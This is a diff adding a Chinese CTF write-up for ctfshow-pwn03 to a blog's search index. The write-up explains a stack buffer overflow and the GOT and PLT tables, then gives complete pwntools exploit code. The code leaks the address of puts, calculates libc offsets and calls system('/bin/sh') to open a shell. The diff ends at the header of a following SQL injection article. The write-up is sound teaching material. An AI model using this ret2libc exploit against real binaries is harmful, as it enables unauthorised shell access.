@@ -1,6 +1,66 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ctfshow-pwn03</title>
+    <url>/%E6%A0%88%E6%BA%A2%E5%87%BA/ctfshow-pwn03/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又是一处新知识</p>
+<p><a href="https://sm.ms/image/Gkolp13FJPnisC5" target="_blank"><img src="https://s2.loli.net/2022/03/02/Gkolp13FJPnisC5.jpg" ></a></p>
+<span id="more"></span>
+
+<p>分析一下附件：</p>
+<p><a href="https://sm.ms/image/Iz2MtnSdEBPa7RO" target="_blank"><img src="https://s2.loli.net/2022/03/02/Iz2MtnSdEBPa7RO.png" ></a></p>
+<h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p><a href="https://sm.ms/image/vCbBxSyNaDtK937" target="_blank"><img src="https://s2.loli.net/2022/03/02/vCbBxSyNaDtK937.png" ></a></p>
+<p><a href="https://sm.ms/image/B9oTnMIRGhpg2as" target="_blank"><img src="https://s2.loli.net/2022/03/02/B9oTnMIRGhpg2as.png" ></a></p>
+<p>pwnme函数出fgets接受100个字节，但是s只开辟了9个字节.<code>存在栈溢出</code> 。</p>
+<p>接着就是找到<code>system函数</code>的位置了。</p>
+<p><a href="https://sm.ms/image/Kx4Y82iREH3OTkg" target="_blank"><img src="https://s2.loli.net/2022/03/02/Kx4Y82iREH3OTkg.png" ></a></p>
+<p><a href="https://sm.ms/image/QgrTAd1LbCExkHZ" target="_blank"><img src="https://s2.loli.net/2022/03/02/QgrTAd1LbCExkHZ.png" ></a></p>
+<p>但是都没有发现<code>system函数</code>和<code>&#39;/bin/sh&#39;</code> 。</p>
+<p>经过一番研究之后，发现要用到<code>plt表</code>和<code>got表</code></p>
+<h1 id="关键知识点"><a href="#关键知识点" class="headerlink" title="关键知识点"></a>关键知识点</h1><ul>
+<li><p>全局偏移表<code>（GOT：Global Offset Table）</code>存放外部的函数地址  </p>
+</li>
+<li><p>程序链接表<code>（PLT：Procedure Link Table）</code>存放额外代码</p>
+</li>
+<li><p>延迟绑定：只有动态库函数在被调用时，才会地址解析和重定位工作</p>
+</li>
+<li><p>程序执行后，plt表里是got表的地址，got表是函数的真实地址  </p>
+</li>
+<li><p>程序还未执行时，got表里还是plt表的地址</p>
+</li>
+</ul>
+<p><a href="https://sm.ms/image/UbLd2fXpVATi3JG" target="_blank"><img src="https://s2.loli.net/2022/03/02/UbLd2fXpVATi3JG.png" ></a></p>
+<p>由上可知，需要泄露got表里面的地址，但是由于开启了ASLR<code>本地和远程的地址不一样</code>。</p>
+<p>但也只是针对于地址中间位进行随机，最低的12位并不会发生改变；</p>
+<p>也就是需要获取到远程环境的函数的真实地址；</p>
+<p>进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与&#x2F;bin&#x2F;sh的偏移，最终getshell</p>
+<h1 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h1><p>首先栈溢出，利用puts函数的plt表的地址，泄漏puts函数的got表中的函数的真实地址,然后返回地址填写main函数重新跳转回来</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br></pre></td></tr></table></figure>
+
+
+<p><a href="https://sm.ms/image/SPo9V4Qieh2w1mR" target="_blank"><img src="https://s2.loli.net/2022/03/02/SPo9V4Qieh2w1mR.png" ></a></p>
+<p>得到puts函数的真实地址<code>0xf7db5360</code></p>
+<p>传两个<code>\n\n</code> 原因是u32是将字符转换为小端序。</p>
+<p>当知道了<code>puts函数的真实地址</code>之后就可以<code>根据后三位判断libc的版本</code></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">Libc<i class="fa fa-external-link-alt"></i></span></p>
+<p><a href="https://sm.ms/image/xvcr7J19RC5yDYg" target="_blank"><img src="https://s2.loli.net/2022/03/02/xvcr7J19RC5yDYg.png" ></a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libcbase = get_addr - <span class="number">0x067360</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x03cd10</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>,system_addr,<span class="string">b&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>完整EXP</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br><span class="line"></span><br><span class="line">libcbase = get_addr - <span class="number">0x067360</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x03cd10</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>,system_addr,<span class="string">b&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://sm.ms/image/tGNqoxhbkQ2m4KY" target="_blank"><img src="https://s2.loli.net/2022/03/02/tGNqoxhbkQ2m4KY.png" ></a></p>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>WP</tag>
+        <tag>栈溢出</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入详解2.0-重构篇</title>
     <url>/SQLInject/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A32.0-%E9%87%8D%E6%9E%84%E7%AF%87/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><blockquote>
